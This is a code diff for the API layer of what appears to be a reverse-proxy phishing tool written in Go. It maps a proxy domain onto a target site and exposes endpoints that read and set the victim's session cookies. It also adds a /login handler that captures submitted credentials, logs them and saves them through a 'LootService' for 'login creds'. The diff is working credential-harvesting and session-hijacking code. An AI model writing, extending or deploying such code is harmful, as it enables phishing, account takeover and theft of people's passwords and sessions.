@@ -1,6 +1,7 @@
 package main
 
 import (
+	"log"
 	"net/http"
 	"net/url"
 	"strings"
@@ -16,6 +17,10 @@ type APIConfig struct {
 	APIHostname string
 	// DomainConverter used to convert proxy domain to target original domain
 	DomainConverter DomainConverter
+	// AuthHandler for cookies endpoints
+	AuthHandler fiber.Handler
+	// LootService to save login creds
+	LootService LootService
 }
 
 func NewAPIMiddleware(conf APIConfig) fiber.Handler {
@@ -24,10 +29,13 @@ func NewAPIMiddleware(conf APIConfig) fiber.Handler {
 	api.Use(cors.New(cors.Config{
 		AllowCredentials: true,
 	}))
-	api.Get("/cookies", func(c *fiber.Ctx) error {
+	api.Post("/login", conf.AuthHandler, func(c *fiber.Ctx) (err error) {
+		return m.SaveCreds(c)
+	})
+	api.Get("/cookies", conf.AuthHandler, func(c *fiber.Ctx) error {
 		return m.GetCookies(c)
 	})
-	api.Post("/cookies", func(c *fiber.Ctx) error {
+	api.Post("/cookies", conf.AuthHandler, func(c *fiber.Ctx) error {
 		return m.CreateCookie(c)
 	})
 	apiHandler := api.Handler()
@@ -49,7 +57,7 @@ func (m *apiMiddleware) GetCookies(c *fiber.Ctx) error {
 	if err != nil {
 		return err
 	}
-	cookieJar := c.Locals("cookieJar").(http.CookieJar)
+	cookieJar := getCookieJar(c)
 	cookies := cookieJar.Cookies(destURL)
 	cookieStr := make([]string, 0, len(cookies))
 	for _, cookie := range cookies {
@@ -67,6 +75,7 @@ func (m *apiMiddleware) CreateCookie(c *fiber.Ctx) error {
 	if err := cookie.ParseBytes(c.Body()); err != nil {
 		return err
 	}
+	// TODO convert cookie domain
 	newCookie := &http.Cookie{
 		Name:     utils.UnsafeString(cookie.Key()),
 		Value:    utils.UnsafeString(cookie.Value()),
@@ -77,7 +86,7 @@ func (m *apiMiddleware) CreateCookie(c *fiber.Ctx) error {
 		Secure:   cookie.Secure(),
 		HttpOnly: cookie.HTTPOnly(),
 	}
-	cookieJar := c.Locals("cookieJar").(http.CookieJar)
+	cookieJar := getCookieJar(c)
 	cookieJar.SetCookies(destURL, []*http.Cookie{newCookie})
 	return nil
 }
@@ -86,4 +95,13 @@ func (m *apiMiddleware) getOrigin(c *fiber.Ctx) (destURL *url.URL, err error) {
 	origin := m.DomainConverter.ToTargetURL(c.Get("Origin"))
 	destURL, err = url.Parse(origin)
 	return
+}
+
+func (m *apiMiddleware) SaveCreds(c *fiber.Ctx) (err error) {
+	var info APILoginInfo
+	if err = c.BodyParser(&info); err != nil {
+		return
+	}
+	log.Println("loginInfo = ", info)
+	return m.LootService.SaveCreds(c, &info)
 }
